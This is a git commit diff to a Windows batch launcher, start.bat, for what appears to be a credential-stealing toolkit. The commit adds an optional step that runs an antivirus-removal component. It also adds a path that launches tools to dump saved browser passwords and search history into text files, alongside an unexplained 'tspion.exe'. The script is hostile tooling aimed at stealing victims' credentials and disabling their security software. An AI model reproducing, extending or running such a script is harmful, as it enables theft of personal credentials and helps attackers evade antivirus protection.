3e3a58da5045c0e9849847e316f7db13ea369bd9
Ross Epstein <rossepstein@aol.com>
2014-09-04 17:36:34 -0400

    Makes Antivirus removal optional

--- start.bat
+++ start.bat
@@ -7,8 +7,8 @@ echo Would you like to reset the data files before initliazing? (Y or N)
 set /p reset=
 if %reset% == "Y" goto :DoReset
 if %reset% == "y" goto :DoReset
-if %reset% == "N" goto :l33t
-if %reset% == "n" goto :l33t
+if %reset% == "N" goto :Anti-REM
+if %reset% == "n" goto :Anti-REM
 :DoReset
 cls
 echo Deleting data files...
@@ -19,7 +19,23 @@ del passwords.txt
 del searches.txt
 del wireless_keys.txt
 cls
-goto :l33t
+goto :Anti-REM
+:Anti-REM
+echo Would you like to attempt to remove the Anti-Virus? (Y or N)
+set /p Anti-REM=
+if %Anti-REM% == "Y" goto :l33t
+if %Anti-REM% == "y" goto :l33t
+if %Anti-REM% == "N" goto :nl33t
+if %Anti-REM% == "n" goto :nl33t
+:nl33t
+ping localhost -n 5 >nul
+start tspion.exe
+start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
+start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
+start .\App\CommandLine\Process.exe
+pause
+start .\App\options.bat
+goto eof
 :l33t
 start .\App\AV_REM
 ping localhost -n 5 >nul
